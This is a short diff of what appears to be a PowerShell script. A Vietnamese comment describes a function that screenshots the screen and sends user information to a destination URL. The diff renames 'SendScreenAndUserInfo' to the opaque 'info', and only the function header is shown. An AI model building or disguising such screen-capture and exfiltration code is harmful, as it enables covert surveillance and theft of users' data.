@@ -1,5 +1,5 @@
 # Hàm chụp ảnh màn hình và gửi thông tin
-function SendScreenAndUserInfo {
+function info {
     param(
         [Parameter(Mandatory = $true)]
         [String]$hq # URL đích để gửi thông tin
